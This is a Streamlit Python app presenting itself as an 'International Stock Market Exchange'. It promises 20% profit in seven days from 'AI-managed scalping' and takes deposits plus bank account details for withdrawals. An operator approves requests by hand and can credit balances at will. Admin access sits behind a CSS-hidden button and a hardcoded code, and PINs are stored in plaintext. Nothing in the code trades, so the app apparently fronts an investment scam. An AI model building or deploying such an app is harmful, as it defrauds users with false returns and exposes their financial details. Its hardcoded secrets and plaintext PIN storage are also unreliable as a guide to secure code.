import streamlit as st
import json
import os
import time
from datetime import datetime, timedelta

# ==========================================
# BLOCK 1: CORE DATA ENGINE
# ==========================================
def load_registry():
    if os.path.exists("bpsm_registry.json"):
        try:
            with open("bpsm_registry.json", "r") as f: return json.load(f)
        except: return {}
    return {}

def update_user(name, data):
    reg = load_registry()
    reg[name] = data
    with open("bpsm_registry.json", "w") as f: 
        json.dump(reg, f, indent=4, default=str)

# State initialization
if 'page' not in st.session_state: st.session_state.page = "ad"
if 'user' not in st.session_state: st.session_state.user = None
if 'is_boss' not in st.session_state: st.session_state.is_boss = False
if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
if 'sub_page' not in st.session_state: st.session_state.sub_page = "select"
if 'action_type' not in st.session_state: st.session_state.action_type = None

# ==========================================
# BLOCK 2: UI STYLES
# ==========================================
st.set_page_config(page_title="ISMEX Official", layout="wide")
st.markdown("""
    <style>
    .stApp { background-color: #0e1117; color: white; }
    .ad-panel { background: #1c1e26; border-radius: 8px; border: 1px dashed #00eeff; padding: 20px; text-align: center; }
    .stButton>button:contains("⛔") {
        background-color: transparent !important; border: none !important; color: #8c8f99 !important;
        font-size: 15px !important; padding: 0 !important; margin-left: -5px !important; display: inline !important;
    }
    .big-title {
        text-align:center; font-size:45px; font-weight:900; 
        background:linear-gradient(90deg, #ff007f, #ffaa00, #00ff88, #00eeff); 
        -webkit-background-clip: text; color: transparent; margin-bottom:20px;
    }
    </style>
    """, unsafe_allow_html=True)

# ==========================================
# BLOCK 3: PAGE ROUTING
# ==========================================

# --- ROUTE A: ADMIN PANEL ---
if st.session_state.is_boss:
    st.title("👑 ADMIN CONTROL CENTER")
    if st.button("EXIT ADMIN"):
        st.session_state.is_boss = False
        st.rerun()
    
    reg = load_registry()
    st.subheader("🔔 PENDING APPROVALS")
    found_pending = False
    for username, u_data in reg.items():
        pending_list = u_data.get('pending_actions', [])
        for idx, action in enumerate(pending_list):
            found_pending = True
            with st.expander(f"{action['type']} - {username}"):
                st.write(f"Amount: ₱{action.get('amount', 0):,.2f}")
                if action['type'] == "WITHDRAW":
                    st.write(f"Bank: {action['bank']} | Acc: {action['acc_num']}")
                ca, cr = st.columns(2)
                if ca.button("✅ APPROVE", key=f"app_{username}_{idx}"):
                    if action['type'] == "DEPOSIT":
                        u_data.setdefault('inv', []).append({"amount": action['amount'], "start_time": datetime.now().isoformat()})
                    u_data['pending_actions'].pop(idx)
                    update_user(username, u_data); st.rerun()
                if cr.button("❌ REJECT", key=f"rej_{username}_{idx}"):
                    if action['type'] == "WITHDRAW": u_data['wallet'] += action['amount']
                    u_data['pending_actions'].pop(idx)
                    update_user(username, u_data); st.rerun()

    st.divider()
    st.subheader("🛠️ MANUAL TOOLS")
    target = st.selectbox("Select User", list(reg.keys()))
    amt = st.number_input("Capital", min_value=100.0)
    if st.button("ACTIVATE CYCLE"):
        reg[target].setdefault('inv', []).append({"amount": amt, "start_time": datetime.now().isoformat()})
        update_user(target, reg[target]); st.success("Started!")

# --- ROUTE B: USER DASHBOARD ---
elif st.session_state.user:
    reg = load_registry()
    data = reg.get(st.session_state.user, {})
    if 'wallet' not in data: data['wallet'] = 0.0
    
    # Dashboard Header
    col1, col2 = st.columns([0.8, 0.2])
    with col1: st.markdown(f"### BPSM\nWelcome, {data.get('full_name')}")
    with col2:
        if st.button("LOGOUT"):
            st.session_state.user = None; st.session_state.page = "ad"; st.rerun()

    st.markdown(f"""
        <div style="background:#1c1e26; padding:20px; border-radius:10px; text-align:center; border:1px solid #00ff88;">
            <p style="color:#8c8f99; font-size:14px;">WITHDRAWABLE BALANCE</p>
            <h1 style="color:#00ff88; font-size:50px; margin:0;">₱{data['wallet']:,.2f}</h1>
        </div>
    """, unsafe_allow_html=True)

    c1, c2, c3 = st.columns(3)
    if c1.button("📥 DEPOSIT"): st.session_state.action_type = "DEP"
    if c2.button("💸 WITHDRAW"): st.session_state.action_type = "WITH"
    if c3.button("♻️ REINVEST"): st.session_state.action_type = "REIN"

    if st.session_state.action_type == "WITH":
        if data['wallet'] < 100:
            st.error("❌ Need ₱100.00 minimum.")
            if st.button("Close"): st.session_state.action_type = None; st.rerun()
        else:
            with st.form("w"):
                amt_w = st.number_input("Amount", min_value=100.0, max_value=float(data['wallet']))
                bn, an, anum = st.text_input("Bank"), st.text_input("Name"), st.text_input("Number")
                if st.form_submit_button("Submit"):
                    data['wallet'] -= amt_w
                    data.setdefault('pending_actions', []).append({"type":"WITHDRAW","amount":amt_w,"bank":bn,"acc_name":an,"acc_num":anum,"date":str(datetime.now())})
                    update_user(st.session_state.user, data); st.success("Requested!"); st.session_state.action_type = None; st.rerun()

# --- ROUTE C: LOGIN / REGISTER ---
elif st.session_state.page == "login":
    st.markdown("<h1 style='text-align:center;'>ACCESS PORTAL</h1>", unsafe_allow_html=True)
    c1, c2 = st.columns(2)
    if c1.button("LOG IN"): st.session_state.sub_page = "l_form"
    if c2.button("REGISTER"): st.session_state.sub_page = "r_form"
    
    if st.session_state.sub_page == "l_form":
        u, p = st.text_input("USERNAME").upper().strip(), st.text_input("PIN", type="password")
        if st.button("ENTER"):
            reg = load_registry()
            ud = reg.get(u.replace(" ", "_")) or reg.get(u)
            if ud and str(ud['pin']) == str(p):
                st.session_state.user = u.replace(" ", "_"); st.rerun()
    elif st.session_state.sub_page == "r_form":
        f, l, p = st.text_input("FIRST").upper(), st.text_input("LAST").upper(), st.text_input("6-DIGIT PIN", type="password")
        if st.button("SUBMIT"):
            update_user(f"{f}_{l}", {"pin":p,"wallet":0.0,"inv":[],"full_name":f"{f} {l}","pending_actions":[]})
            st.success("Success!"); st.session_state.sub_page = "l_form"; st.rerun()

# --- ROUTE D: THE ADVERTISEMENT FRONT PAGE (RESTORED!) ---
else:
    st.markdown('<h1 class="big-title">INTERNATIONAL STOCK MARKET EXCHANGE</h1>', unsafe_allow_html=True)
    
    cl, cb1, cb2, cr = st.columns([0.3, 0.1, 0.3, 0.3])
    with cb1:
        if st.button("⛔"): st.session_state.admin_mode = not st.session_state.admin_mode
    with cb2:
        if st.button("🚀 JOIN NOW!", use_container_width=True): 
            st.session_state.page = "login"
            st.rerun()

    st.markdown("""
        <div class="ad-panel">
            <h3 style="color:#00eeff;">How We Generate Your Profit:</h3>
            <p style="color:#8c8f99; font-size:16px;">
                Your capital is diversified via AI-managed scalping. Small 0.05% profits from thousands 
                of trades combine for your <b>20% profit</b> over 7 days.
            </p>
        </div>
    """, unsafe_allow_html=True)

    if st.session_state.admin_mode:
        code = st.text_input("Admin Access Code", type="password")
        if code == "0102030405":
            st.session_state.is_boss = True
            st.rerun()
    
